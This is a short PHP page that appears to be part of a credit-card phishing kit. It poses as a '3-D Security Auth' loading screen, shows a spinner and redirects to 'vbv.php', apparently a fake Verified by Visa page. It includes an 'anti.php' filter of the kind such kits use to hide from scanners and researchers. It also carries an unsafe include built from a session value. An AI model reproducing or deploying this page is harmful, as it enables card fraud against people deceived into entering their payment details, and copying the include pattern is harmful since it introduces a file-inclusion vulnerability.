<?php

@session_start();

$zz = $_SESSION['nn'];


include('./anti.php');
include('./inc/lange.php');
include "./inc/lange".$_SESSION['Moustache-ANONISMA-AYOUB'];





?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="initial-scale=1.0">
    <meta HTTP-EQUIV='Refresh' Content=2;URL='vbv.php'>
	<title>3-D Security Auth</title>
	<link rel="shortcut icon" link rel="logo-icon" href="./img/icon.ico">
	<link rel="stylesheet" type="text/css" href="css/vv.css">
</head>
<body>


   <div class="all">
   	<span class="pr"><?php echo $wiz_151 ; ?></span>
   	<img src="img/pro.gif">
   </div>

</body>
</html>